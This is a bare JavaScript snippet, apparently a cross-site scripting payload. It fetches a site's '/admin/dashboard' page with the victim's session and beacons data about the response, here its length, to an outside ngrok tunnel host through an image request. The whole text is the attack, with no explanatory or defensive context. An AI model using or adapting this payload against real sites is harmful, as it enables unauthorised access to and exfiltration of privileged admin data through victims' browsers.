fetch("/admin/dashboard")
.then(r=>r.text())
.then(d=>{
new Image().src="https://7368-2402-800-61c7-539d-60ad-28f0-6942-5ea2.ngrok-free.app/?len="+d.length
})
